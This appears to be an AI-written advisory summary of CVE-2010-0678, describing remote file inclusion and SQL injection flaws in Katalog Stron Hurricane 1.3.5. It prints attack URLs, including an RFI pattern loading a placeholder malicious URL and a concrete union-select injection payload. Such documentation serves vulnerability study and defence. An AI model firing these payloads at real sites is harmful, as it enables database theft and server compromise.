Based on the provided content, here's a breakdown of the vulnerability information:

**CVE ID:** CVE-2010-0678

**Vulnerability Details:**

*   **Root Cause:** The vulnerability stems from two primary issues in "Katalog Stron Hurricane" version 1.3.5:
    *   **Remote File Inclusion (RFI):** The `includes/moderation.php` script includes a file based on the user-controlled `includes_directory` parameter without proper sanitization, allowing an attacker to include remote files.
    *  **SQL Injection:** The `index.php` script is vulnerable to SQL injection via the `get` parameter within the `category` include.
*   **Weaknesses/Vulnerabilities Present:**
    *   **Unvalidated Input:** The application does not properly sanitize user-supplied input, specifically the `includes_directory` parameter in `moderation.php` and the `get` parameter in `index.php`.
    *   **Insecure Inclusion:** The `include()` function in `moderation.php` is used insecurely allowing for remote file inclusion.
    *  **SQL Injection:**  The application is vulnerable to SQL injection.
*   **Impact of Exploitation:**
    *   **Remote File Inclusion:** An attacker can execute arbitrary code on the server by including a malicious remote file, potentially leading to complete compromise of the system.
    *   **SQL Injection:** An attacker can access and manipulate the database, potentially leading to data breaches, data manipulation, or other malicious actions.
*   **Attack Vectors:**
    *   **RFI:** By crafting a malicious URL with a controlled `includes_directory` parameter, such as:  `http://127.0.0.1/[kaMtiEz]/includes/moderation.php?includes_directory=[MALICIOUS_URL]`.
    *   **SQL Injection:** By manipulating the `get` parameter within the category include: `http://127.0.0.1/[kaMtiEz]/index.php?inc=category&get=[SQL_INJECTION_PAYLOAD]` an attacker can inject SQL queries.  The provided example payload is `6666+union+all+select+1,database(),3--`.
*   **Required Attacker Capabilities/Position:**
    *   The attacker must have the ability to send HTTP requests to the vulnerable application.
    *   No authentication is required to exploit the vulnerabilities.
